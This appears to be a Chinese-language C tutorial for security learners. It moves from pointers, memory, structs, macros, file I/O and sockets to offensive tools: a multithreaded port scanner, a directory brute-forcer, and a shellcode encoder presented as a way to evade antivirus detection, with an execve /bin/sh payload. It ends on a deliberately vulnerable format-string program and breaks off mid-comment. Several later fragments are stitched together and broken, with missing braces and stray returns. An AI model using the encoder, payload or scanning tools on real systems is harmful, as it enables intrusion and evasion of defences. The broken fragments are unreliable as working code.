## 一、进阶语法知识

### 1.1 指针进阶（多级指针、函数指针、void指针）

指针是 C 语言的灵魂，也是大多数内存安全漏洞的根源。

```c
#include <stdio.h>
#include <stdlib.h>

// ===== 多级指针 =====
void multi_level_pointer() {
    int value = 42;
    int *p1 = &value;       // 一级指针
    int **p2 = &p1;         // 二级指针
    int ***p3 = &p2;        // 三级指针（较少见）

    printf("value = %d\n", value);
    printf("*p1 = %d\n", *p1);
    printf("**p2 = %d\n", **p2);
    printf("***p3 = %d\n", ***p3);

    // 通过二级指针修改值
    **p2 = 100;
    printf("修改后 value = %d\n", value);
}

// ===== 函数指针 =====
int add(int a, int b) { return a + b; }
int subtract(int a, int b) { return a - b; }
int multiply(int a, int b) { return a * b; }

void function_pointer_demo() {
    // 声明函数指针：返回值类型 (*指针名)(参数类型列表)
    int (*op)(int, int);

    op = add;
    printf("3 + 4 = %d\n", op(3, 4));

    op = subtract;
    printf("10 - 3 = %d\n", op(10, 3));

    // 函数指针数组（跳转表）
    int (*operations[])(int, int) = {add, subtract, multiply};
    printf("5 * 6 = %d\n", operations[2](5, 6));
}

// ===== void 指针（通用指针） =====
void void_pointer_demo() {
    int i = 42;
    float f = 3.14f;
    char c = 'A';

    void *ptr;

    ptr = &i;
    printf("int值: %d\n", *(int *)ptr);  // 必须强转类型才能解引用

    ptr = &f;
    printf("float值: %.2f\n", *(float *)ptr);

    ptr = &c;
    printf("char值: %c\n", *(char *)ptr);
}

// ===== 回调函数示例 =====
int compare_int(const void *a, const void *b) {
    return (*(int *)a - *(int *)b);
}

void qsort_demo() {
    int arr[] = {5, 2, 8, 1, 9, 3, 7, 4, 6};
    int n = sizeof(arr) / sizeof(arr[0]);

    // qsort 是标准库函数，使用回调函数进行比较
    qsort(arr, n, sizeof(int), compare_int);

    printf("排序后: ");
    for (int i = 0; i < n; i++) printf("%d ", arr[i]);
    printf("\n");
}

int main() {
    multi_level_pointer();
    function_pointer_demo();
    void_pointer_demo();
    qsort_demo();
    return 0;
}
```

### 1.2 内存管理深入（malloc/free、堆与栈）

理解内存布局是漏洞分析和利用的基础。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ===== 栈内存 =====
// 由系统自动分配和释放，速度快，大小有限
void stack_memory() {
    int a = 10;                 // 栈上的整型
    char str[100];              // 栈上的数组
    strcpy(str, "hello");       // 栈溢出的常见场景！

    printf("栈变量 a = %d, 地址: %p\n", a, (void *)&a);
    printf("栈数组 str = %s, 地址: %p\n", str, (void *)str);
}

// ===== 堆内存 =====
// 由程序员手动分配和释放，大小灵活，速度较慢
void heap_memory() {
    // 分配内存
    int *arr = (int *)malloc(10 * sizeof(int));
    if (arr == NULL) {
        printf("内存分配失败！\n");
        return;
    }

    // 初始化内存
    memset(arr, 0, 10 * sizeof(int));

    // 使用内存
    for (int i = 0; i < 10; i++) {
        arr[i] = i * i;
    }

    printf("堆数组地址: %p\n", (void *)arr);
    printf("arr[5] = %d\n", arr[5]);

    // 重新分配内存（扩容）
    int *new_arr = (int *)realloc(arr, 20 * sizeof(int));
    if (new_arr != NULL) {
        arr = new_arr;
        printf("扩容后地址: %p\n", (void *)arr);
    }

    // 释放内存
    free(arr);
    arr = NULL;  // 避免野指针

    // Use-After-Free 示例（危险！）
    // printf("%d\n", arr[0]);  // 错误：使用已释放的内存
}

// ===== 常见内存错误 =====
void common_memory_bugs() {
    // 1. 内存泄漏：分配了不释放
    char *leak = (char *)malloc(1024);
    // ... 函数结束没有 free

    // 2. 重复释放
    char *double_free = (char *)malloc(100);
    // free(double_free);
    // free(double_free);  // 错误：重复释放

    // 3. 越界访问
    char buf[10];
    // buf[20] = 'A';  // 错误：越界写入

    // 4. 野指针
    char *wild;
    // *wild = 'A';  // 错误：未初始化的指针

    // 5. 悬空指针
    char *dangling = (char *)malloc(100);
    free(dangling);
    // dangling[0] = 'A';  // 错误：使用已释放的指针
}

// ===== 内存布局 =====
void print_memory_layout() {
    static int global_var = 100;       // 全局/静态区
    const char *str_literal = "hello"; // 只读数据区
    int local_var = 42;                // 栈
    int *heap_ptr = malloc(100);       // 堆

    printf("全局区地址: %p\n", (void *)&global_var);
    printf("只读区地址: %p\n", (void *)str_literal);
    printf("栈地址:     %p\n", (void *)&local_var);
    printf("堆地址:     %p\n", (void *)heap_ptr);

    free(heap_ptr);
}

int main() {
    stack_memory();
    heap_memory();
    print_memory_layout();
    return 0;
}
```

### 1.3 结构体与联合体高级用法

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// ===== 结构体 =====
struct Person {
    char name[50];
    int age;
    float height;
};

// ===== 结构体指针 =====
void struct_pointer() {
    struct Person p = {"张三", 25, 1.75f};
    struct Person *p_ptr = &p;

    // 两种访问方式
    printf("姓名: %s\n", (*p_ptr).name);  // 解引用后点访问
    printf("年龄: %d\n", p_ptr->age);      // 箭头访问（更常用）

    // 动态分配结构体
    struct Person *p2 = (struct Person *)malloc(sizeof(struct Person));
    strcpy(p2->name, "李四");
    p2->age = 30;
    p2->height = 1.80f;

    printf("p2: %s, %d岁, %.2fm\n", p2->name, p2->age, p2->height);
    free(p2);
}

// ===== 结构体字节对齐 =====
struct NotAligned {
    char a;     // 1字节
    int b;      // 4字节
    char c;     // 1字节
};  // 实际大小：12字节（有填充）

struct Aligned {
    int b;      // 4字节
    char a;     // 1字节
    char c;     // 1字节
};  // 实际大小：8字节（更紧凑）

void struct_alignment() {
    printf("NotAligned 大小: %zu 字节\n", sizeof(struct NotAligned));
    printf("Aligned 大小: %zu 字节\n", sizeof(struct Aligned));
    // 为什么不一样？因为内存对齐——CPU按字长访问更高效
}

// ===== 位域 =====
struct Flags {
    unsigned int is_active : 1;    // 只占1位
    unsigned int is_admin : 1;     // 只占1位
    unsigned int priority : 3;     // 占3位 (0-7)
    unsigned int status : 2;       // 占2位 (0-3)
};  // 总共只需要1字节，但通常对齐到int（4字节）

void bit_field_demo() {
    struct Flags f = {0};
    f.is_active = 1;
    f.is_admin = 0;
    f.priority = 5;
    f.status = 2;

    printf("Flags 大小: %zu 字节\n", sizeof(struct Flags));
    printf("active: %d, admin: %d, priority: %d, status: %d\n",
           f.is_active, f.is_admin, f.priority, f.status);
}

// ===== 联合体（Union） =====
// 所有成员共享同一块内存，大小为最大成员的大小
union Data {
    int i;
    float f;
    char bytes[4];
};

void union_demo() {
    union Data d;
    d.i = 0x41424344;  // 用整数赋值

    printf("union 大小: %zu 字节\n", sizeof(union Data));
    printf("整数: 0x%08x\n", d.i);
    printf("浮点: %f\n", d.f);
    printf("字节: %c %c %c %c\n",
           d.bytes[0], d.bytes[1], d.bytes[2], d.bytes[3]);
    // 注意：字节顺序取决于大小端（Little Endian / Big Endian）
}

// ===== 结构体链表 =====
struct Node {
    int data;
    struct Node *next;
};

struct Node* create_node(int value) {
    struct Node *node = (struct Node *)malloc(sizeof(struct Node));
    node->data = value;
    node->next = NULL;
    return node;
}

void linked_list_demo() {
    // 创建链表：1 -> 2 -> 3
    struct Node *head = create_node(1);
    head->next = create_node(2);
    head->next->next = create_node(3);

    // 遍历链表
    printf("链表: ");
    struct Node *cur = head;
    while (cur != NULL) {
        printf("%d -> ", cur->data);
        cur = cur->next;
    }
    printf("NULL\n");

    // 释放链表
    while (head != NULL) {
        struct Node *temp = head;
        head = head->next;
        free(temp);
    }
}

int main() {
    struct_pointer();
    struct_alignment();
    bit_field_demo();
    union_demo();
    linked_list_demo();
    return 0;
}
```

### 1.4 预处理器与宏编程

```c
#include <stdio.h>
#include <stdlib.h>

// ===== 宏定义 =====
#define PI 3.1415926
#define MAX_SIZE 1024
#define VERSION "1.0.0"

// ===== 带参数的宏 =====
#define MAX(a, b) ((a) > (b) ? (a) : (b))
#define MIN(a, b) ((a) < (b) ? (a) : (b))
#define ABS(x)   ((x) < 0 ? -(x) : (x))
#define SQUARE(x) ((x) * (x))

// 注意：宏参数一定要加括号！
// 错误示例：#define SQUARE(x) x * x
// SQUARE(3+2) 会展开成 3+2 * 3+2 = 3+6+2 = 11，而不是 25

// ===== 多行宏 =====
#define SWAP(a, b) do { \
    typeof(a) _tmp = (a); \
    (a) = (b); \
    (b) = _tmp; \
} while(0)
// 使用 do{...}while(0) 包裹，确保宏在任何地方使用都正确

// ===== 字符串化与拼接 =====
#define STR(x) #x
#define CONCAT(a, b) a##b

// ===== 条件编译 =====
#ifdef DEBUG
    #define LOG(msg) printf("[DEBUG] %s\n", msg)
#else
    #define LOG(msg)  // 发布版不输出
#endif

// ===== 常用预定义宏 =====
void predefined_macros() {
    printf("文件名: %s\n", __FILE__);
    printf("行号: %d\n", __LINE__);
    printf("函数: %s\n", __func__);
    printf("日期: %s\n", __DATE__);
    printf("时间: %s\n", __TIME__);
    printf("编译器版本: %d.%d.%d\n",
           __GNUC__, __GNUC_MINOR__, __GNUC_PATCHLEVEL__);
}

// ===== 宏使用示例 =====
void macro_demo() {
    printf("PI = %f\n", PI);
    printf("MAX(3, 5) = %d\n", MAX(3, 5));
    printf("MIN(3, 5) = %d\n", MIN(3, 5));
    printf("ABS(-7) = %d\n", ABS(-7));
    printf("SQUARE(5) = %d\n", SQUARE(5));

    int x = 10, y = 20;
    printf("交换前: x=%d, y=%d\n", x, y);
    SWAP(x, y);
    printf("交换后: x=%d, y=%d\n", x, y);

    // 字符串化
    printf("STR(hello) = %s\n", STR(hello));

    // 标记拼接
    int CONCAT(my, Var) = 42;  // 等价于 int myVar = 42;
    printf("myVar = %d\n", myVar);

    LOG("调试信息");  // 取决于是否定义了 DEBUG
}

// ===== include guards =====
// 在头文件中使用，防止重复包含
#ifndef MY_HEADER_H
#define MY_HEADER_H
// 头文件内容
#endif

int main() {
    macro_demo();
    predefined_macros();
    return 0;
}
```

### 1.5 文件操作进阶

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ===== 文件打开模式 =====
// r   只读，文件必须存在
// w   只写，文件不存在则创建，存在则清空
// a   追加，文件不存在则创建，存在则追加
// r+  读写，文件必须存在
// w+  读写，文件不存在则创建，存在则清空
// a+  读写追加，文件不存在则创建
// b   二进制模式（与上面组合使用，如 rb、wb、ab+）

// ===== 二进制文件读写 =====
void binary_file_demo() {
    struct Student {
        char name[20];
        int age;
        float score;
    };

    // 写入二进制文件
    FILE *fw = fopen("students.dat", "wb");
    if (fw == NULL) {
        perror("打开文件失败");
        return;
    }

    struct Student s1 = {"张三", 20, 85.5f};
    struct Student s2 = {"李四", 21, 90.0f};

    fwrite(&s1, sizeof(struct Student), 1, fw);
    fwrite(&s2, sizeof(struct Student), 1, fw);
    fclose(fw);

    // 读取二进制文件
    FILE *fr = fopen("students.dat", "rb");
    if (fr == NULL) {
        perror("打开文件失败");
        return;
    }

    struct Student s;
    while (fread(&s, sizeof(struct Student), 1, fr) == 1) {
        printf("姓名: %s, 年龄: %d, 成绩: %.1f\n", s.name, s.age, s.score);
    }
    fclose(fr);
}

// ===== 文件指针定位 =====
void file_seek_demo() {
    FILE *f = fopen("test.txt", "w+");
    if (f == NULL) { perror("fopen"); return; }

    fputs("Hello World!", f);

    // 获取当前位置
    long pos = ftell(f);
    printf("写入后位置: %ld\n", pos);

    // 移动到开头
    rewind(f);

    // 从指定位置读取
    char buf[20];
    fgets(buf, sizeof(buf), f);
    printf("从开头读取: %s\n", buf);

    // fseek: 从 whence 偏移 offset 字节
    // SEEK_SET  从文件开头
    // SEEK_CUR  从当前位置
    // SEEK_END  从文件结尾
    fseek(f, 6, SEEK_SET);    // 移动到第6字节
    fputs("C", f);            // 写入 C 覆盖 W

    rewind(f);
    fgets(buf, sizeof(buf), f);
    printf("修改后: %s\n", buf);

    // 获取文件大小
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    printf("文件大小: %ld 字节\n", size);

    fclose(f);
}

// ===== 读取整个文件到内存 =====
char* read_file_to_memory(const char *filename, long *out_size) {
    FILE *f = fopen(filename, "rb");
    if (f == NULL) {
        perror("fopen");
        return NULL;
    }

    // 获取文件大小
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    // 分配内存（+1 用于字符串终止符）
    char *buf = (char *)malloc(size + 1);
    if (buf == NULL) {
        fclose(f);
        return NULL;
    }

    // 读取文件
    size_t bytes_read = fread(buf, 1, size, f);
    buf[bytes_read] = '\0';

    if (out_size) *out_size = bytes_read;

    fclose(f);
    return buf;
}

// ===== 逐行读取大文件 =====
void read_lines(const char *filename) {
    FILE *f = fopen(filename, "r");
    if (f == NULL) { perror("fopen"); return; }

    char line[1024];
    int line_num = 0;
    while (fgets(line, sizeof(line), f) != NULL) {
        line_num++;
        // 去掉换行符
        line[strcspn(line, "\n")] = '\0';
        printf("第%d行: %s\n", line_num, line);
    }

    fclose(f);
}

int main() {
    binary_file_demo();
    file_seek_demo();

    // 测试读取文件
    FILE *f = fopen("test.txt", "w");
    fputs("line1\nline2\nline3\n", f);
    fclose(f);

    read_lines("test.txt");

    long size;
    char *content = read_file_to_memory("test.txt", &size);
    if (content) {
        printf("\n文件内容 (%ld字节):\n%s", size, content);
        free(content);
    }

    return 0;
}
```

### 1.6 网络编程（socket）

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

#define PORT 8080
#define BUF_SIZE 4096

// ===== TCP 客户端 =====
void tcp_client(const char *host, int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) { perror("socket"); return; }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    // 解析主机名
    struct hostent *he = gethostbyname(host);
    if (he == NULL) {
        herror("gethostbyname");
        close(sockfd);
        return;
    }
    memcpy(&server_addr.sin_addr, he->h_addr, he->h_length);

    // 连接服务器
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect");
        close(sockfd);
        return;
    }

    printf("已连接到 %s:%d\n", host, port);

    // 发送数据
    const char *msg = "GET / HTTP/1.0\r\n\r\n";
    send(sockfd, msg, strlen(msg), 0);

    // 接收数据
    char buf[BUF_SIZE];
    ssize_t n;
    while ((n = recv(sockfd, buf, BUF_SIZE - 1, 0)) > 0) {
        buf[n] = '\0';
        printf("%s", buf);
    }

    close(sockfd);
}

// ===== TCP 服务端 =====
void tcp_server(int port) {
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) { perror("socket"); return; }

    // 设置地址复用（避免端口占用问题）
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(server_fd);
        return;
    }

    if (listen(server_fd, 5) < 0) {
        perror("listen");
        close(server_fd);
        return;
    }

    printf("服务器监听端口 %d...\n", port);

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);

        int client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
        if (client_fd < 0) {
            perror("accept");
            continue;
        }

        char client_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
        printf("新连接: %s:%d\n", client_ip, ntohs(client_addr.sin_port));

        // 处理客户端（简单回显）
        char buf[BUF_SIZE];
        ssize_t n = recv(client_fd, buf, BUF_SIZE - 1, 0);
        if (n > 0) {
            buf[n] = '\0';
            printf("收到: %s\n", buf);
            send(client_fd, buf, n, 0);  // 回显
        }

        close(client_fd);
        printf("连接已关闭\n");
    }

    close(server_fd);
}

// ===== UDP 客户端 =====
void udp_client(const char *host, int port) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) { perror("socket"); return; }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &server_addr.sin_addr);

    const char *msg = "Hello UDP!";
    sendto(sockfd, msg, strlen(msg), 0,
           (struct sockaddr *)&server_addr, sizeof(server_addr));

    char buf[BUF_SIZE];
    socklen_t len = sizeof(server_addr);
    ssize_t n = recvfrom(sockfd, buf, BUF_SIZE - 1, 0,
                         (struct sockaddr *)&server_addr, &len);
    if (n > 0) {
        buf[n] = '\0';
        printf("收到: %s\n", buf);
    }

    close(sockfd);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("用法: %s <server|client|udp>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "server") == 0) {
        tcp_server(PORT);
    } else if (strcmp(argv[1], "client") == 0) {
        tcp_client("127.0.0.1", PORT);
    } else if (strcmp(argv[1], "udp") == 0) {
        udp_client("127.0.0.1", PORT);
    }

    return 0;
```

```c
    sleep(2);  // 模拟生产过程

    pthread_mutex_unlock(&g_cv_mutex);

    return NULL;

    while (!g_data_ready) {  // 用while防止虚假唤醒

    return NULL;
```

```c
 * 函数调用时的栈布局（x86 32位示例）：
 *
 * 高地址  +----------------+  <- 调用者的栈帧
 *         |   返回地址     |
 *         +----------------+
 *         |   旧EBP        |  <- EBP 指向这里
 *         +----------------+
 *         |                |
 *         |   局部变量      |  buffer[64] 在这里
 *         |                |
 * 低地址  +----------------+  <- ESP 指向这里
 *
 * 当输入超过64字节时，会覆盖旧EBP和返回地址
 * 攻击者通过控制返回地址，可以控制程序执行流
 */

    char buf[100];
    char src[] = "很长很长很长很长很长很长很长很长很长的字符串";

    // gets(buf);               // 极度危险，已被移除

    // fgets（代替 gets）
    // fgets(buf, sizeof(buf), stdin);

/*
 * 现代操作系统有多种防护机制对抗栈溢出：
 *
 * 1. ASLR（地址空间随机化）
 *    - 栈、堆、库的加载地址随机化
 *    - 编译选项：操作系统级别启用
 *
 * 2. Stack Canary（栈保护）
 *    - 在返回地址前放置一个随机值（金丝雀）

 * 3. DEP/NX（数据执行保护）
 *    - 栈和堆上的数据不可执行
 *    - 防止直接执行 Shellcode
 *    - Windows: /NXCOMPAT  Linux: 操作系统默认
 *
 * 4. PIE（位置无关可执行文件）
 *    - 程序本身加载地址也随机化
 *    - 编译选项：-fPIE -pie
 *
 * 5. RELRO（重定位只读）
 *    - GOT 表设为只读，防止 GOT 覆盖
 *    - 编译选项：-Wl,-z,relro,-z,now

// 编译时安全选项示例：

//     -fPIE -pie \              // 位置无关可执行

//     -Wl,-z,noexecstack \      // 不可执行栈

    safe_function(argv[1]);

    dangerous_functions();

    return 0;
```

```c
        (b < 0 && a < INT_MIN - b)) {
        return -1;  // 溢出
    }
    *result = a + b;
    return 0;

int safe_multiply(int a, int b, int *result) {
    if (a == 0 || b == 0) {
        *result = 0;
        return 0;
    }
    if (a > 0) {
        if (b > 0) {
            if (a > INT_MAX / b) return -1;
        } else {
            if (b < INT_MIN / a) return -1;
        }
    } else {
        if (b > 0) {
            if (a < INT_MIN / b) return -1;
        } else {
            if (b < INT_MAX / a) return -1;
        }
    }
    *result = a * b;
    return 0;
}
```

```c
// ===== 扫描单个端口 =====
int scan_port(const char *host, int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return -1;

    // 设置超时
    struct timeval tv;
    tv.tv_sec = TIMEOUT;
    tv.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    // 解析地址
    struct hostent *he = gethostbyname(host);
    if (he == NULL) {
        close(sockfd);
        return -1;
    }
    memcpy(&server_addr.sin_addr, he->h_addr, he->h_length);

    // 尝试连接
    int result = connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));
    close(sockfd);

    return (result == 0) ? 1 : 0;  // 1=开放, 0=关闭
}

void multi_thread_scan(const char *host, int start, int end, int num_threads) {
    printf("扫描 %s 端口 %d-%d (线程数: %d)\n", host, start, end, num_threads);
    printf("开始扫描...\n");

    time_t start_time = time(NULL);

    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    ScanArgs *args = malloc(num_threads * sizeof(ScanArgs));

    // 分配端口范围
    int total = end - start + 1;
    int per_thread = total / num_threads;

    for (int i = 0; i < num_threads; i++) {
        strncpy(args[i].host, host, 255);
        args[i].thread_id = i;
        args[i].start_port = start + i * per_thread;
        args[i].end_port = (i == num_threads - 1) ? end : args[i].start_port + per_thread - 1;

        pthread_create(&threads[i], NULL, scan_worker, &args[i]);
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    time_t end_time = time(NULL);

    printf("\n扫描完成！\n");
    printf("发现 %d 个开放端口:\n", open_count);

        printf("  %d/tcp open\n", open_ports[i]);

    free(threads);
    free(args);
}
```

```c
// ===== 发送 HTTP 请求，获取状态码 =====
int http_request(const char *host, int port, const char *path, int timeout) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return -1;

    // 设置超时
    struct timeval tv;
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    struct hostent *he = gethostbyname(host);
    if (he == NULL) {
        close(sockfd);
        return -1;
    }
    memcpy(&server_addr.sin_addr, he->h_addr, he->h_length);

    // 连接
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sockfd);
        return -1;
    }

    // 构造请求
    char request[1024];
    snprintf(request, sizeof(request),
             "GET /%s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: DirBuster/1.0\r\n"
             "Connection: close\r\n"
             "\r\n",
             path, host);

    // 发送请求
    if (send(sockfd, request, strlen(request), 0) < 0) {
        close(sockfd);
        return -1;
    }

    // 读取响应头
    char response[BUF_SIZE];
    ssize_t total = 0;
    ssize_t n;

    while (total < BUF_SIZE - 1) {
        n = recv(sockfd, response + total, BUF_SIZE - 1 - total, 0);
        if (n <= 0) break;
        total += n;
        // 找到响应头结束就停止
        if (strstr(response, "\r\n\r\n") != NULL) break;
    }
    response[total] = '\0';
    close(sockfd);

    // 解析状态码
    int status_code = 0;
    if (strncmp(response, "HTTP/", 5) == 0) {
        char *space = strchr(response + 5, ' ');
        if (space) {
            status_code = atoi(space + 1);
        }
    }

    return status_code;
}

// ===== 多线程爆破参数 =====
typedef struct {
    char host[256];
    int port;
    char **paths;
    int start_idx;
    int end_idx;
    int timeout;
    int *found_count;
    int *total_count;
    pthread_mutex_t *mutex;
} BruteArgs;

// 常见的跳过状态码
int is_interesting(int status) {
    // 200-299 成功
    if (status >= 200 && status < 300) return 1;
    // 301/302 重定向
    if (status == 301 || status == 302) return 1;
    // 401/403 权限相关
    if (status == 401 || status == 403) return 1;
    // 405 方法不允许（说明存在）
    if (status == 405) return 1;
    return 0;
}

const char* status_description(int status) {
    switch (status) {
        case 200: return "OK";
        case 301: return "Moved Permanently";
        case 302: return "Found (Redirect)";
        case 401: return "Unauthorized";
        case 403: return "Forbidden";
        case 404: return "Not Found";
        case 405: return "Method Not Allowed";
        case 500: return "Internal Server Error";
        default:  return "Unknown";
    }
}

void* brute_worker(void *arg) {
    BruteArgs *args = (BruteArgs *)arg;

    for (int i = args->start_idx; i < args->end_idx; i++) {
        const char *path = args->paths[i];
        int status = http_request(args->host, args->port, path, args->timeout);

        pthread_mutex_lock(args->mutex);
        (*args->total_count)++;

        if (is_interesting(status)) {
            (*args->found_count)++;
            printf("  [%d] %s  (%s)\n", status, path, status_description(status));
        }

        // 进度
        if (*args->total_count % 100 == 0) {
            printf("\r进度: %d", *args->total_count);
            fflush(stdout);
        }
        pthread_mutex_unlock(args->mutex);
    }

    return NULL;
}

// ===== 加载字典文件 =====
char** load_dict(const char *filename, int *out_count) {
    FILE *f = fopen(filename, "r");
    if (!f) {
        perror("打开字典文件失败");
        return NULL;
    }

    // 先统计行数
    int count = 0;
    char line[MAX_PATH_LEN];
    while (fgets(line, sizeof(line), f) != NULL) {
        count++;
    }

    // 分配内存
    char **paths = malloc(count * sizeof(char *));
    if (!paths) {
        fclose(f);
        return NULL;
    }

    // 读取路径
    rewind(f);
    int idx = 0;
    while (fgets(line, sizeof(line), f) != NULL) {
        // 去掉换行和前导/后导的 /
        line[strcspn(line, "\n")] = '\0';
        line[strcspn(line, "\r")] = '\0';

        // 去掉开头的 /
        char *start = line;
        while (*start == '/') start++;

        if (strlen(start) > 0) {
            paths[idx] = strdup(start);
            idx++;
        }
    }

    fclose(f);
    *out_count = idx;
    return paths;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("目录爆破工具 (C语言版)\n");

        printf("  %s 127.0.0.1 8080 common.txt 20 2\n", argv[0]);
        return 1;
    }

    const char *host = argv[1];
    int port = atoi(argv[2]);
    const char *dict_file = argv[3];
    int num_threads = (argc > 4) ? atoi(argv[4]) : 10;
    int timeout = (argc > 5) ? atoi(argv[5]) : 3;

    // 加载字典
    int dict_size = 0;
    char **paths = load_dict(dict_file, &dict_size);
    if (!paths) {
        printf("加载字典失败\n");
        return 1;
    }

    printf("目标: http://%s:%d\n", host, port);
    printf("字典: %s (%d 条)\n", dict_file, dict_size);
    printf("线程: %d\n", num_threads);
    printf("超时: %d 秒\n\n", timeout);
    printf("开始扫描...\n");

    time_t start_time = time(NULL);

    pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
    int found_count = 0;
    int total_count = 0;

    // 创建线程
    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    BruteArgs *args = malloc(num_threads * sizeof(BruteArgs));

    int per_thread = dict_size / num_threads;

    for (int i = 0; i < num_threads; i++) {
        strncpy(args[i].host, host, 255);
        args[i].port = port;
        args[i].paths = paths;
        args[i].start_idx = i * per_thread;
        args[i].end_idx = (i == num_threads - 1) ? dict_size : (i + 1) * per_thread;
        args[i].timeout = timeout;
        args[i].found_count = &found_count;
        args[i].total_count = &total_count;
        args[i].mutex = &mutex;

        pthread_create(&threads[i], NULL, brute_worker, &args[i]);
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    time_t end_time = time(NULL);

    printf("\r                          \r");
    printf("\n扫描完成！\n");
    printf("发现 %d 个可能存在的路径\n", found_count);
    printf("总请求数: %d\n", total_count);
    printf("耗时: %ld 秒\n", end_time - start_time);
    if (end_time > start_time) {
        printf("速度: %.0f 请求/秒\n", (double)total_count / (end_time - start_time));
    }

    // 清理
    for (int i = 0; i < dict_size; i++) {
        free(paths[i]);
    }
    free(paths);
    free(threads);
    free(args);

    return 0;
}
```

### 4.1 自定义 Shellcode 编码器

编写自定义 Shellcode 编码器，用于绕过杀毒软件检测。

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// XOR 编码器
void xor_encode(unsigned char *shellcode, int len, unsigned char key) {
    for (int i = 0; i < len; i++) {
        shellcode[i] ^= key;
    }
}

// 加法递增编码器
void add_encode(unsigned char *shellcode, int len) {
    for (int i = 0; i < len; i++) {
        shellcode[i] = (shellcode[i] + i) & 0xFF;
    }
}

// 加法递减解码器
void add_decode(unsigned char *shellcode, int len) {
    for (int i = 0; i < len; i++) {
        shellcode[i] = (shellcode[i] - i) & 0xFF;
    }
}

// 打印 shellcode 格式
void print_shellcode(const unsigned char *sc, int len) {
    printf("unsigned char shellcode[] = \"");
    for (int i = 0; i < len; i++) {
        if (i > 0 && i % 16 == 0) printf("\"\\n    \"");
        printf("\\x%02x", sc[i]);
    }
    printf("\";\\n");
    printf("长度: %d 字节\\n", len);
}

// 检测坏字符
void detect_badchars(const unsigned char *sc, int len, const unsigned char *bad, int bad_len) {
    printf("坏字符检测结果:\\n");
    for (int i = 0; i < len; i++) {
        for (int j = 0; j < bad_len; j++) {
            if (sc[i] == bad[j]) {
                printf("  偏移 0x%04x: 0x%02x (坏字符)\\n", i, bad[j]);
            }
        }
    }
}

int main() {
    // 示例 shellcode (Linux x86 execve /bin/sh)
    unsigned char shellcode[] = 
        "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
        "\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80";
    int len = 25;
    
    printf("原始 shellcode:\\n");
    print_shellcode(shellcode, len);
    
    // XOR 编码
    unsigned char encoded[256];
    memcpy(encoded, shellcode, len);
    xor_encode(encoded, len, 0xAA);
    printf("\\nXOR 编码后 (key=0xAA):\\n");
    print_shellcode(encoded, len);
    
    // 坏字符检测
    unsigned char badchars[] = {0x00, 0x0a, 0x0d};
    detect_badchars(shellcode, len, badchars, 3);
    
    return 0;
}
```

### 4.2 格式化字符串漏洞利用

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 存在格式化字符串漏洞的程序
void vulnerable(char *input) {
    printf(input);  // 漏洞点！应该是 printf("%s", input)
}

int main(int argc, char *argv[]) {
    char buf[256];
    
    if (argc > 1) {
        strncpy(buf, argv[1], sizeof(buf)-1);
        vulnerable(buf);
    }
    
    return 0;
}

/*

2. 读取指定位置:
